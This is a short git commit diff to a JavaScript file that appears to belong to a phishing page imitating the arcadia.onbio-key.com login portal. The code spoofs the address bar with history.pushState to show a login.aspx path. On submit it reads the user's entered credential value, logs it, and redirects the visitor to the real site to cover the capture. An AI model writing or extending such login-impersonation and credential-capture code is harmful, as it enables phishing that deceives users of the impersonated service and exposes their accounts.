7f420c30b7ca513e6333e0d6a4688d11eb4a0b87
Adamspera <adamspera@hotmail.com>
2022-09-21 19:01:16 +0000

    Redo submit button

--- public/javascript/index.js
+++ public/javascript/index.js
@@ -1,5 +1,9 @@
-window.history.pushState("https://arcadia.onbio-key.com/", "", '/_layouts/PG/login.aspx?ReturnUrl=%2Fsso%2Fdefault.aspx');
+window.history.pushState("https://arcadia.onbio-key.com/", "", '/_layouts/PG/login.aspx?ReturnUrl=%2f');
 
 document.getElementById("submitButton").addEventListener('click', function () {
+  var useremail = document.getElementById("credential").value
+
+  console.log(useremail)
+  
   location.href = "https://arcadia.onbio-key.com";
 });
